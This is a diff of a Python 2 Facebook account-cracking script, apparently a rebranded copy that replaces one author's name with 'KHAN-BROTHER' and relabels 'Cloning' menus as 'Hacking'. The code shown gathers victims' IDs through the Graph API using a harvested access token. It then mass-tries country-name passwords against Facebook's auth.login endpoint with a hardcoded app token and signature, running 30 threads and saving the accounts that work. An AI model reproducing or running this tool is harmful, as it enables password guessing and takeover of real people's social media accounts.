@@ -876,8 +756,8 @@ def login1():
 		print logo13
 		jalan(' \033[1;91mWarning  \033[1;92mDo Not Use Your Personal Account' )
 		jalan(' \033[1;91mWarning  \033[1;92mUse a New Account To Login' )
-		jalan(' \033[1;91mWarning  \033[1;92mJam Shahrukh King Of Facebook' )                 
-		print "\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"
+		jalan(' \033[1;91mWarning  \033[1;92mKHAN BROTHER King Of Virtual' )                 
+		print "\033[1;95m«-----------------\033[1;91mKHAM-BROTHER\033[1;95m-----------------»"
 		print('\033[1;97m\x1b[1;92m..............LOGIN WITH FACEBOOK.............\x1b[1;97m' )
 		print('	' )
 		id = raw_input('\033[1;97m[] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
@@ -980,19 +860,19 @@ def menu():
         time.sleep(0.05)
         print "\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"
         time.sleep(0.05)
-	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;96m\033[1;92m Start    Cloning JAM-SHAHRUKH   "
+	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;96m\033[1;92m Start    Hacking  KHAN-BROTHER   "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;96m\033[1;91m Start    Target  Hacking        "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;96m\033[1;91m Start    Target  Hacking         "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\033[1;96m\033[1;93m Facebook Report  JAM-SHAHRUKH      "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\033[1;96m\033[1;93m Facebook Report  KHAN-BROTHER    "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\033[1;96m\033[1;95m Friend's User    information      "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\033[1;96m\033[1;95m Friend's User    information     "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\033[1;96m\033[1;96m ID Not   Found   Problum solve  "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\033[1;96m\033[1;96m ID Not   Found   Problum solve   "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\x1b[1;96m\033[1;91m JAM-SHAHRUKH    infom Massage  "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\x1b[1;96m\033[1;91m KHAN-BROTHER    infom Massage    "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;96m\033[1;93m JAM-SHAHRUKH    Youtube Chenal   "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;96m\033[1;93m KHAN-H4K3R      Youtube Chenal   "
         time.sleep(0.05)
         print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m8 .\033[1;96m\033[1;92m Login    Using   Token          "
         time.sleep(0.05)
@@ -1038,18 +918,19 @@ def pilih():
                 jalan('\033[1;96mpkg install git')
                 jalan('\033[1;96mpip2 install requests')
                 jalan('\033[1;96mpip2 install mechanize') 
-                jalan("\033[1;96mgit clone https://github.com/Jam302/jamshahrukh.git")
-                jalan('\033[1;96mcd jamshahrukh')
-                jalan('\033[1;96mpython2 jam.py')
-                jalan('\033[1;96mUser:jam')
-                jalan('\033[1;96mpass:jam')
+                jalan("\033[1;96mgit clone https://github.com/Khanbrother420/KHAN.git")
+                jalan('\033[1;96mcd KHANBROTHER')
+                jalan('\033[1;96mpython2 khan.py')
+                jalan('\033[1;96mUser:KHAN')
+                jalan('\033[1;96mpass:KHAN')
                 jalan('\033[1;92m👆Copy Command & send 2 groups👆')
                 jalan('\033[1;91mYoutube Chenal Like Subscrib')
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 		menu()
         elif unikers =="7":
-	        os.system('xdg-open https://m.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+	        os.system('xdg-open https://m.youtube.com/channel/UCaDycv8l8cGtCzIYR8ukEvg')
+			
 	        menu()
         elif unikers =="8":
 		tokenz()
@@ -1099,27 +980,27 @@ def crack():
 		login()
 	os.system('clear')
 	print logo19
-	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;95m Start Cloning Pakistan       "
+	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;95m Start Haking Pakistan       "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;95m Start Cloning India          "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;95m Start Hacking  India          "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\x1b[1;95m Start Cloning Indonesia      "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\x1b[1;95m Start Hacking Indonesia      "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\x1b[1;95m Start Cloning United State   "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\x1b[1;95m Start Hacking United State   "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\x1b[1;95m Start Cloning Bangladesh     "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\x1b[1;95m Start Hacking Bangladesh     "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\x1b[1;95m Start Cloning All Country    "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\x1b[1;95m Start Hacking All Country    "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;95m Start Cloning Indian Old     "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;95m Start Hacking  Indian Old     "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m8 .\033[1;95m Start Cloning Pakistan Old   "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m8 .\033[1;95m Start Hacking  Pakistan Old   "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m9 .\033[1;95m Start Cloning JAM-SHAHRUKH   "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m9 .\033[1;95m Start Hacking KHAN-BROTHER   "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m10.\033[1;95m Start Cloning pak Testing    "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m10.\033[1;95m Start Hacking pak Testing    "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m11.\x1b[1;95m Start Cloning Group uncomplete "
+        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m11.\x1b[1;95m Start Hacking Group uncomplete "
         time.sleep(0.05)
 	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0 .\033[1;91m Back"
 	pilih_crack()
@@ -1133,7 +1014,7 @@ def pilih_crack():
 		os.system('clear')
 		print logo
 		jjt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
-		print "\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"
+		print "\033[1;95m«-----------------\033[1;91mKHAN-BRPTHER\033[1;95m-----------------»"
 		try:
 			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
 			td = json.loads(m.text)
@@ -1177,11 +1058,11 @@ def pilih_crack():
 	jalan('\033[1;93mPlease Wait\033[1;93m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;93mHackig\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m         Start Cloning Pakistan ')
+	jalan(' \033[1;93mPlz Wait Hacking Accounts Will Appear Here')
+        jalan(' \033[1;95m         Start Hacking  Bangladesh ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -1191,7 +1072,7 @@ def pilih_crack():
 		try:
 			os.mkdir('cookie')
 		except OSError:
-			pass #Dev:Jam_Shahrukh
+			pass #Dev:KHAN_BOTHER
 		try:
 			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			y = json.loads(k.text)
@@ -1209,7 +1090,7 @@ def pilih_crack():
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = 'Pakistan'
+					pass2 = 'Bangladesh'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					s = json.load(data)
 					if 'access_token' in s:
@@ -1299,10 +1180,10 @@ def pilih_crack():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKHAN-BROTHER\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By KHAN-BROTHER---•◈•---»" #Dev:KHAN_BROTHER
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
-        print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
+        print '\033[1;95mNext Type (python2 khan.py) Next login facebook Start HaHacking\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mCheckpoint \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
  
@@ -1311,8 +1192,8 @@ def pilih_crack():
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
 : \033[1;91m ....JAM-SHAHRUKH....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
-                WhatsApp Num
-              \033[1;91m +971528752764"""
+                FACEBOOK 
+              \033[1;91m Mr.KhanVau420"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	crack()
@@ -1329,7 +1210,7 @@ def hack():
 		login()
 	os.system('clear')
 	print logo9
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;96mClone Friend List Public ID."
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;96mHack Friend List Public ID."
         time.sleep(0.05)
 	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_hack()
@@ -1343,7 +1224,7 @@ def pilih_hack():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mKHAN-BROTHER\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -1367,11 +1248,11 @@ def pilih_hack():
 	jalan('\033[1;91mPlease Wait\033[1;94m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;93Hacking\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
-	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m         Start Cloning Indonesia ')
+	jalan(' \033[1;93mPlz Wait Hacking Accounts Will Appear Here')
+        jalan(' \033[1;95m         Start Hacking Indonesia ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -1381,7 +1262,7 @@ def pilih_hack():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Jam_Shahrukh
+			pass #Dev:KHAN_BROTHER🔰🔰🔰🔰🔰
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
